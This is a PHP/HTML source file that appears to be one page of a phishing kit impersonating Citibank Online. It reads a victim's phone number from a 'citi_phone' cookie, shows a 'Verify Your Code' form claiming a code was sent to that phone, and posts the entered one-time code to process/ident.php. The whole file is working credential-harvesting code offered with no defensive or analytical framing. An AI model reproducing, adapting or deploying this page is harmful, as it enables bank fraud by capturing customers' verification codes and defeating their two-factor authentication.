<?php
$rootDir = dirname(__DIR__, 2);
$settings = require_once $rootDir . '/settings/settings.php';

if (!is_array($settings)) {
    $settings = array();
}

if (!empty($settings['debug']) && $settings['debug'] == '1') {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
} else {
    error_reporting(0);
}

$phone = isset($_COOKIE['citi_phone']) ? trim($_COOKIE['citi_phone']) : '';
?>
<!DOCTYPE html>
<html class="cbolui-ddl" lang="en" style="display: block; visibility: visible;">
<head>
<meta charset="utf-8">
<title>Citibank Online</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/x-icon" href="img/favicon.ico">
<link rel="stylesheet" href="css/styles.css">
<style>
body { font-family: Arial, sans-serif; background: #f4f4f4; }
.container { max-width: 480px; margin: 80px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
input { width: 100%; padding: 12px; margin-top: 10px; border: 1px solid #ccc; border-radius: 4px; }
button { margin-top: 16px; width: 100%; padding: 12px; background: #0b5fa5; color: #fff; border: 0; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<div class="container">
  <h2>Verify Your Code</h2>
  <p>We sent a verification code to your phone number.</p>
  <form action="process/ident.php" method="POST">
    <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone, ENT_QUOTES, 'UTF-8'); ?>">
    <label for="code">Enter code</label>
    <input type="text" id="code" name="code" placeholder="Code" required>
    <button type="submit">Continue</button>
  </form>
</div>
</body>
</html>
